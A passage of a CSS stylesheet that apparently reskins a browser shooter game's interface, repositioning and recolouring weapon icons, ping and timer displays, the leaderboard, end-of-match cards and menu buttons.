    opacity: 0 !important;
    text-shadow: 2px 2px 0px #000 !important;
}

.weapItem[style*=""1""] .weapIcon {
    position: fixed;
    bottom: 40px;
    right: calc(50% - 64px);
    text-shadow: 2px 2px 0px #000 !important;
}

.weapItem:last-child .weapIcon {
    transform: translateY(16px);
    text-shadow: 2px 2px 0px #000 !important;
}


#weapIconMel {
    margin: 0 !important;
    text-shadow: 2px 2px 0px #000 !important;
}

.weapKey, .weapSkin, .weapStreakHolder {
    display: none;
}

.greyInner {
	background: transparent;
	margin: unset;
	padding: unset;
}

/*Top Left*/

#pingDisplay .material-icons, #ingressDisplay .material-icons, #egressDisplay .material-icons {
    font-size: 24px;
}

#pingIcon {
    color: var(--accent) !important;
}

#timerHolder.topLeftOld {
    position: fixed;
    left: 50%;
    bottom: 15%;
    transform: translateX(-50%);
    background-color: transparent;
    text-shadow: 2px 2px 0px #000 !important;
}

#timerVal.topLeftOld {
    text-shadow: 2px 2px 4px #000 !important;
}

#timerIcon.topLeftOld {
    width: 24px;
    height: 24px;
    filter: brightness(5);
    text-shadow: 2px 2px 0px #000 !important;
}

.leftUIB {
    background-color: transparent;
}

#ingressDisplay .material-icons, #egressDisplay .material-icons, #egressIcon {
    font-size: 20px !important;
    color: var(--accent) !important;
}

#pingText {
	color: var(--accent) !important
}

.debugInfo {
	margin-left: 20px
}

/*Top Right*/

#streakCount {
    position: fixed;
    left: 50%;
    bottom: 10%;
    transform: translate(-50%);
	margin: unset;
}

.statIcon {
    background-color: transparent;
    color: #fff;
    text-shadow: 2px 2px 4px #000;
    font-size: 32px;
	margin-right: 10px;
	padding: 5px 10px;
}

#killsIcon, #deathsIcon, #streakIcon, #kdIcon {
    width: 28px;
    height: 28px;
}

.statIcon span {
	color: #fff !important;
}

/*Leaderboard*/

#leaderContainer::before {
    content: ""leaderboard"";
    display: flex;
    font-size: 24px;
    color: #fff;
    border-bottom: 4px solid var(--accent);
    border-image-slice: 1;
    margin-bottom: 8px;
    padding-bottom: 4px;
}

#leaderDisplay {
    background-color: transparent;
}

.leaderName, .newLeaderName, .newLeaderNameF, .endTableN[style*=""color:#eb5656""] {
    color: var(--accent) !important;
}

/*End Card*/

#victorySub {
    display: none;
}

.teamTotals {
    background-color: transparent;
}

.teamTotalN0 {
    color: rgba(44,44,44);
    text-shadow: 0 0 4px var(--accent), 0 0 4px var(--accent);
}

.teamTotalN1 {
    color: var(--accent);
    text-shadow: 0 0 4px var(--accent), 0 0 4px var(--accent);
}


.teamTotalScore, .teamTotalN0, .teamTotalN1 {
    font-size: 24px;
}

#matchVoteHolder {
    background-color: transparent;
}

.matchVote {
    transition-duration: 0.25s;
}

.matchVote:hover {
    box-shadow: 0 0 8px 2px var(--accent);
}

.matchVoteThumb:hover {
    opacity: unset;
    transform: unset;
}

.endCard {
    border-radius: 12px;
    background-color: rgba(0,0,0,0.4);
    box-shadow: 0 0 8px 2px var(--accent);
}

.tabHeader.selected {
    color: var(--accent);
    border-color: var(--accent);
}

.reportBut {
    color: var(--accent);
}

#endTable span[style=""color:#F8C55C""] {
    color: var(--accent) !important;
}

/*Spectate*/

#specNames, #specContr {
    background-color: transparent;
    text-shadow: 2px 2px #000;
}
#menuBtnProfile,#menuBtnShop {
    font-size:0 !important;
}

#menuBtnProfile:after,#menuBtnShop:after {
    font-size:24px !important;
}

#menuBtnProfile:after {
    content:'Profile';
}

#menuBtnShop:after {
    content:'Shop';
}

#rankedSoonTm {
    visibility:hidden;
}

#rankedSoonTm:after {
    visibility:Hidden;
    content:'1 year anniversary coming since the faceit partner announcement';
}"
